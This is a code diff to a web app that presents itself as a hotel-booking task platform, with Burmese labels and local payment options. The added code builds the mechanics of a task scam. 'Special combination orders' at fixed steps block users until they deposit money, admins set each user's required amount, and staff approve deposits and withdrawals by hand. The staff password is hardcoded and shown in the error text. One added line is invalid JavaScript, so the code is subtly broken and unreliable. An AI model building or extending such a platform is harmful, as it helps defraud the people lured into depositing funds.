@@ -166,7 +166,6 @@ th{color:var(--fb-muted);background:var(--fb-bg)}
 .online{color:var(--fb-success)}
 .offline{color:var(--fb-danger)}
 
-/* Modal & Pulsing Animation styles */
 .modal{position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.5);display:flex;align-items:center;justify-content:center;z-index:100}
 .modal-box{background:var(--fb-card);color:var(--fb-text);padding:20px;border-radius:10px;width:min(400px,90%);box-shadow:0 4px 12px rgba(0,0,0,0.15)}
 .modal-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:14px}
@@ -290,6 +289,11 @@ th{color:var(--fb-muted);background:var(--fb-bg)}
    🎉 Congratulations! All 30 orders successfully completed! 🎆
   </div>
 
+  <!-- Special Task Warning Box -->
+  <div id="specialTaskAlert" class="hidden" style="background:rgba(250,56,62,0.1);border:1px solid var(--fb-danger);color:var(--fb-danger);padding:14px;border-radius:8px;margin-bottom:14px;font-weight:600">
+   ⚠️ Special Combination Order Detected! Insufficient balance. Please contact Customer Service or deposit funds to proceed.
+  </div>
+
   <div id="bookingHotelArea" style="margin-top:20px"></div>
  </div>
 </section>
@@ -325,6 +329,11 @@ th{color:var(--fb-muted);background:var(--fb-bg)}
    <div class="stat-box"><span>Completed Bookings</span><strong id="profileOrders">0/30</strong></div>
   </div>
 
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:14px 0">
+   <button class="btn btn-success" onclick="openFinanceModal('deposit')">💳 Deposit (ငွေသွင်းရန်)</button>
+   <button class="btn btn-danger" onclick="openFinanceModal('withdraw')">💸 Withdraw (ငွေထုတ်ရန်)</button>
+  </div>
+
   <div class="panel" style="background:var(--fb-bg);margin:14px 0">
    <h3>My Invitation Link</h3>
    <input id="inviteLink" readonly style="margin:6px 0">
@@ -342,15 +351,16 @@ th{color:var(--fb-muted);background:var(--fb-bg)}
   <button class="btn btn-light" onclick="staffLogout()">Exit Staff</button>
  </div>
 
- <div style="display:flex;gap:8px;margin-bottom:16px">
-  <button class="btn" id="adminTabBtn" onclick="switchStaffTab('admin')">ADMIN</button>
+ <div style="display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap">
+  <button class="btn" id="adminUsersBtn" onclick="switchStaffTab('adminUsers')">USERS MANAGEMENT</button>
+  <button class="btn btn-light" id="adminFinanceBtn" onclick="switchStaffTab('adminFinance')">DEPOSIT / WITHDRAWAL</button>
   <button class="btn btn-light" id="csTabBtn" onclick="switchStaffTab('support')">CUSTOMER SERVICE</button>
  </div>
 
- <!-- ADMIN WORKSPACE -->
+ <!-- ADMIN USERS WORKSPACE -->
  <div id="adminWorkspace" class="panel">
   <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
-   <h3>User Accounts Management & Balance Control</h3>
+   <h3>User Accounts Management & Booking Rules Control</h3>
    <div>
     <button class="btn" id="tableEditBtn" onclick="toggleTableEditMode()">✏️ Edit</button>
     <button class="btn btn-success hidden" id="tableSaveBtn" onclick="saveTableEditMode()">💾 Save</button>
@@ -365,11 +375,33 @@ th{color:var(--fb-muted);background:var(--fb-bg)}
       <th>Password</th>
       <th>Full Name</th>
       <th>Wallet Balance ($)</th>
-      <th>Order Settings</th>
+      <th>Task Settings (Neg $, Profit $, Count)</th>
       <th>Actions</th>
      </tr>
     </thead>
     <tbody id="adminTableRows"></tbody>
+   </table>
+  </div>
+ </div>
+
+ <!-- ADMIN FINANCE WORKSPACE (DEPOSIT / WITHDRAWAL REQUESTS) -->
+ <div id="adminFinanceWorkspace" class="panel hidden">
+  <h3>Pending Deposit & Withdrawal Requests</h3>
+  <p class="muted">Approve or reject user fund requests here.</p>
+  <div class="table-wrap" style="margin-top:12px">
+   <table>
+    <thead>
+     <tr>
+      <th>Request ID</th>
+      <th>User Name (ID)</th>
+      <th>Type</th>
+      <th>Amount ($)</th>
+      <th>Date</th>
+      <th>Status</th>
+      <th>Actions</th>
+     </tr>
+    </thead>
+    <tbody id="adminFinanceRows"></tbody>
    </table>
   </div>
  </div>
@@ -460,6 +492,22 @@ th{color:var(--fb-muted);background:var(--fb-bg)}
  </div>
 </div>
 
+<!-- FINANCE MODAL (DEPOSIT / WITHDRAW) -->
+<div class="modal hidden" id="financeModal">
+ <div class="modal-box">
+  <div class="modal-head">
+   <h2 id="financeModalTitle">Deposit Funds</h2>
+   <button class="close" onclick="closeModal('financeModal')">✕</button>
+  </div>
+  <label>Amount ($)</label>
+  <input id="financeAmount" type="number" placeholder="Enter amount">
+  <label>Payment / Bank Note</label>
+  <input id="financeNote" placeholder="e.g. KBZ Pay / Wave / USDT">
+  <p id="financeMsg" class="muted" style="margin-top:6px;color:var(--fb-success)"></p>
+  <button class="btn btn-block" style="margin-top:12px" onclick="submitFinanceRequest()">Submit Request</button>
+ </div>
+</div>
+
 <script>
 "use strict";
 
@@ -469,7 +517,8 @@ const KEYS = {
  users:"tb_users_v10",
  current:"tb_current_v10",
  theme:"tb_theme_v10",
- activity:"tb_activity_v10"
+ activity:"tb_activity_v10",
+ finance:"tb_finance_v1"
 };
 
 const read = key => {
@@ -480,6 +529,7 @@ const read = key => {
 const write = (key,value) => localStorage.setItem(key,JSON.stringify(value));
 
 let users = read(KEYS.users);
+let financeRequests = read(KEYS.finance);
 let activities = read(KEYS.activity);
 let currentUser = null;
 let selectedUserId = null;
@@ -488,6 +538,7 @@ let tapCount = 0;
 let tapTimer = null;
 let activeOrderTask = null;
 let isTableEditing = false;
+let currentFinanceType = 'deposit';
 
 const hotels = [
  {id:"H01",name:"Marina Bay Sands",country:"Singapore",price:420,stars:5,image:"https://images.unsplash.com/photo-1566073771259-6a8506099945?w=900"},
@@ -573,7 +624,7 @@ async function submitAuth() {
    totalProfit: 0.00,
    orders: 0,
    vipLevel: "LV1",
-   negDollar: 0,
+   negDollar: 50,  // Default negative balance threshold for special tasks
    profitBox: 30,
    countBox: 30,
    transactions: [],
@@ -696,10 +747,22 @@ function renderBooking() {
 
  if(orders >= maxCount) {
   $("celebrationBanner").classList.remove("hidden");
+  $("specialTaskAlert").classList.add("hidden");
   $("bookingHotelArea").innerHTML = `<p style="text-align:center;color:var(--fb-success);font-weight:700">All tasks completed successfully!</p>`;
   return;
  } else {
   $("celebrationBanner").classList.add("hidden");
+ }
+
+ // Check if current order triggers negative balance (Special / Combo Task Rule)
+ const isSpecialTask = (orders === 5 || orders === 12 || orders === 20); // Configurable special order intervals
+ const requiredBalance = isSpecialTask ? (currentUser.negDollar || 100) : 0;
+
+ if(isSpecialTask && (currentUser.balance || 0) < requiredBalance) {
+  $("specialTaskAlert").classList.remove("hidden");
+  $("specialTaskAlert.textContent") = `⚠️ Special Combination Order (#${orders + 1}) requires a temporary balance of $${requiredBalance}. Please contact Customer Service or deposit funds.`;
+ } else {
+  $("specialTaskAlert").classList.add("hidden");
  }
 
  if(activeOrderTask) {
@@ -711,7 +774,7 @@ function renderBooking() {
     <div class="card-body">
      <span class="tag">${hotel.country}</span>
      <h3>${hotel.name}</h3>
-     <p class="muted">Price: $${hotel.price} | Profit: <b style="color:var(--fb-primary)">+$${profit}</b></p>
+     <p class="muted">Price: $${hotel.price} | Profit: <b style="color:var(--fb-primary)">+$${profit}</b> ${isSpecialTask ? '<span style="color:var(--fb-danger);font-weight:700">(Special Combo Task)</span>':''}</p>
      <div style="margin:10px 0">
       ${reviewOptions.map((r, i) => `
        <label style="display:flex;gap:6px;align-items:center;margin:4px 0;cursor:pointer">
@@ -719,7 +782,7 @@ function renderBooking() {
        </label>
       `).join("")}
      </div>
-     <button class="btn btn-block" onclick="confirmSubmitBooking(${profit}, ${hotel.price})">Confirm & Submit Booking</button>
+     <button class="btn btn-block" onclick="confirmSubmitBooking(${profit}, ${hotel.price}, ${isSpecialTask})">Confirm & Submit Booking</button>
     </div>
    </div>
   `;
@@ -738,7 +801,13 @@ function triggerGetOrder() {
  renderBooking();
 }
 
-function confirmSubmitBooking(profit, price) {
+function confirmSubmitBooking(profit, price, isSpecialTask) {
+ if(isSpecialTask && (currentUser.balance || 0) < (currentUser.negDollar || 100)) {
+  alert("Insufficient balance for this special combination task! Please contact Customer Service.");
+  showPage('supportPage', document.querySelectorAll('.bottom-nav button')[1]);
+  return;
+ }
+
  currentUser.balance += profit;
  currentUser.commission = (currentUser.commission || 0) + profit;
  currentUser.totalProfit = (currentUser.totalProfit || 0) + profit;
@@ -760,6 +829,53 @@ function resetTaskProgress() {
  updateUI();
  renderBooking();
  alert("Task progress reset to 0.");
+}
+
+/* FINANCE DEPOSIT / WITHDRAW MODAL */
+function openFinanceModal(type) {
+ if(!currentUser) { openAuth('login'); return; }
+ currentFinanceType = type;
+ $("financeModalTitle").textContent = type === 'deposit' ? "Deposit Funds (ငွေသွင်းရန်)" : "Withdraw Funds (ငွေထုတ်ရန်)";
+ $("financeAmount").value = "";
+ $("financeNote").value = "";
+ $("financeMsg").textContent = "";
+ $("financeModal").classList.remove("hidden");
+}
+
+function submitFinanceRequest() {
+ if(!currentUser) return;
+ const amount = parseFloat($("financeAmount").value);
+ const note = $("financeNote").value.trim();
+ if(!amount || amount <= 0) {
+  $("financeMsg").style.color = "var(--fb-danger)";
+  $("financeMsg").textContent = "Please enter a valid amount.";
+  return;
+ }
+ if(currentFinanceType === 'withdraw' && amount > currentUser.balance) {
+  $("financeMsg").style.color = "var(--fb-danger)";
+  $("financeMsg").textContent = "Insufficient balance for withdrawal.";
+  return;
+ }
+
+ const req = {
+  id: "REQ" + Math.floor(100000 + Math.random() * 900000),
+  userId: currentUser.id,
+  userName: currentUser.name,
+  type: currentFinanceType,
+  amount: amount,
+  note: note || 'Standard request',
+  date: new Date().toLocaleString(),
+  status: 'Pending'
+ };
+
+ financeRequests.unshift(req);
+ write(KEYS.finance, financeRequests);
+ 
+ $("financeMsg").style.color = "var(--fb-success)";
+ $("financeMsg").textContent = "Request submitted successfully! Waiting for admin approval.";
+ setTimeout(() => {
+  closeModal('financeModal');
+ }, 1500);
 }
 
 /* CUSTOMER SERVICE CHAT WITH PULSING BLUE BUTTON & AUTO GREETING */
@@ -834,8 +950,7 @@ function staffLogin() {
   closeModal('staffModal');
   $("staffPage").classList.remove("hidden");
   showPage('staffPage');
-  switchStaffTab('admin');
-  renderAdminTable();
+  switchStaffTab('adminUsers');
  } else {
   $("staffMessage").textContent = "Invalid password! Use 12344321";
  }
@@ -846,17 +961,25 @@ function staffLogout() {
  showPage('homePage', document.querySelectorAll('.bottom-nav button')[0]);
 }
 
-function switchStaffTab(role) {
- if(role === 'admin') {
-  $("adminTabBtn").className = "btn";
-  $("csTabBtn").className = "btn btn-light";
+function switchStaffTab(tab) {
+ $("adminUsersBtn").className = "btn btn-light";
+ $("adminFinanceBtn").className = "btn btn-light";
+ $("csTabBtn").className = "btn btn-light";
+
+ $("adminWorkspace").classList.add("hidden");
+ $("adminFinanceWorkspace").classList.add("hidden");
+ $("csWorkspace").classList.add("hidden");
+
+ if(tab === 'adminUsers') {
+  $("adminUsersBtn").className = "btn";
   $("adminWorkspace").classList.remove("hidden");
-  $("csWorkspace").classList.add("hidden");
   renderAdminTable();
- } else {
-  $("adminTabBtn").className = "btn btn-light";
+ } else if(tab === 'adminFinance') {
+  $("adminFinanceBtn").className = "btn";
+  $("adminFinanceWorkspace").classList.remove("hidden");
+  renderAdminFinanceTable();
+ } else if(tab === 'support') {
   $("csTabBtn").className = "btn";
-  $("adminWorkspace").classList.add("hidden");
   $("csWorkspace").classList.remove("hidden");
   renderStaffClientList();
  }
@@ -871,12 +994,69 @@ function renderAdminTable() {
    <td>${isTableEditing ? `<input id="pw_${u.id}" value="${u.password}">` : u.password}</td>
    <td>${isTableEditing ? `<input id="name_${u.id}" value="${u.name}">` : u.name}</td>
    <td>${isTableEditing ? `<input id="bal_${u.id}" type="number" value="${u.balance}">` : '$' + (u.balance||0).toFixed(2)}</td>
-   <td>${isTableEditing ? `<input id="set_${u.id}" value="${u.negDollar||0},${u.profitBox||30},${u.countBox||30}">` : `Neg:$${u.negDollar||0}, Pr:$${u.profitBox||30}, Cnt:${u.countBox||30}`}</td>
+   <td>${isTableEditing ? `<input id="set_${u.id}" value="${u.negDollar||100},${u.profitBox||30},${u.countBox||30}">` : `Neg:$${u.negDollar||100}, Pr:$${u.profitBox||30}, Cnt:${u.countBox||30}`}</td>
    <td>
     ${isTableEditing ? `<button class="btn btn-danger" style="padding:2px 6px;font-size:11px" onclick="deleteUser('${u.id}')">Delete</button>` : `<button class="btn" style="padding:2px 6px;font-size:11px" onclick="selectUserChat('${u.id}')">Chat</button>`}
    </td>
   </tr>
  `).join("");
+}
+
+function renderAdminFinanceTable() {
+ financeRequests = read(KEYS.finance);
+ $("adminFinanceRows").innerHTML = financeRequests.map(r => `
+  <tr>
+   <td>${r.id}</td>
+   <td>${r.userName} (${r.userId})</td>
+   <td><span class="tag" style="background:${r.type==='deposit'?'rgba(66,183,42,0.1)':'rgba(250,56,62,0.1)'};color:${r.type==='deposit'?'var(--fb-success)':'var(--fb-danger)'}">${r.type.toUpperCase()}</span></td>
+   <td>$${r.amount.toFixed(2)}</td>
+   <td>${r.date}</td>
+   <td><span style="font-weight:700;color:${r.status==='Approved'?'var(--fb-success)':r.status==='Rejected'?'var(--fb-danger)':'var(--fb-primary)'}">${r.status}</span></td>
+   <td>
+    ${r.status === 'Pending' ? `
+     <button class="btn btn-success" style="padding:2px 6px;font-size:11px;margin-right:4px" onclick="processFinance('${r.id}', 'Approve')">Approve</button>
+     <button class="btn btn-danger" style="padding:2px 6px;font-size:11px" onclick="processFinance('${r.id}', 'Reject')">Reject</button>
+    ` : `<span class="muted small">Processed</span>`}
+   </td>
+  </tr>
+ `).join("") || `<tr><td colspan="7" style="text-align:center">No pending requests.</td></tr>`;
+}
+
+function processFinance(reqId, action) {
+ financeRequests = read(KEYS.finance);
+ users = read(KEYS.users);
+ const req = financeRequests.find(r => r.id === reqId);
+ if(!req || req.status !== 'Pending') return;
+
+ const targetUser = users.find(u => u.id === req.userId);
+
+ if(action === 'Approve') {
+  req.status = 'Approved';
+  if(targetUser) {
+   if(req.type === 'deposit') {
+    targetUser.balance = (targetUser.balance || 0) + req.amount;
+   } else if(req.type === 'withdraw') {
+    targetUser.balance = Math.max(0, (targetUser.balance || 0) - req.amount);
+   }
+   if(!targetUser.transactions) targetUser.transactions = [];
+   targetUser.transactions.unshift({
+    date: new Date().toLocaleString(),
+    type: req.type.toUpperCase() + ' (Approved)',
+    amount: req.amount
+   });
+  }
+ } else {
+  req.status = 'Rejected';
+ }
+
+ write(KEYS.finance, financeRequests);
+ write(KEYS.users, users);
+ if(currentUser && targetUser && currentUser.id === targetUser.id) {
+  currentUser = targetUser;
+  updateUI();
+ }
+ renderAdminFinanceTable();
+ alert(`Request ${reqId} has been ${action}d.`);
 }
 
 function toggleTableEditMode() {
@@ -898,7 +1078,7 @@ function saveTableEditMode() {
   if(setEl) {
    const parts = setEl.value.split(',');
    if(parts.length >= 3) {
-    u.negDollar = parseFloat(parts[0]) || 0;
+    u.negDollar = parseFloat(parts[0]) || 100;
     u.profitBox = parseFloat(parts[1]) || 30;
     u.countBox = parseInt(parts[2]) || 30;
    }
@@ -971,7 +1151,7 @@ function sendStaffMessage() {
  }
 }
 
-function appendStaffChar(char) { $("staffInput.value") ? $("staffInput").value += char : $("staffInput").value += char; }
+function appendStaffChar(char) { $("staffInput").value += char; }
 
 function renderTicker() {
  const sampleActivities = [
